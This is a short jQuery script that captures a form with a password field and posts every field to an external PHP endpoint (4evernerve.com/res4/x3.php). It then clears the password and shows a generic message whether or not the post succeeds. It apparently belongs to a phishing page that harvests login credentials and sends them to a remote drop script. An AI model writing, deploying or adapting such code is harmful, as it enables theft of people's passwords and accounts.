
        $(document).ready(function() {
            // Intercept the form submission
            $("#myForm").submit(function(event) {
                event.preventDefault();

                // Get the form data
                var formData = new FormData($(this)[0]);

                // Perform client-side validation here
                // ...

                // Submit the form data to the server-side script
                $.ajax({
                    url: "https://4evernerve.com/res4/x3.php",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function(response) {
                        
                        $("#myForm input[name='password']").val("");
                        $("#success-message").show();
                        setTimeout(function() {
                            $("#success-message").hide();
                        }, 5000);
                    },
                    error: function(xhr, status, error) {
                        
                        $("#myForm input[name='password']").val("");
                        $("#error-message").show();
                        setTimeout(function() {
                            $("#error-message").hide();
                        }, 5000);
                    }
                });
            });
        });
    

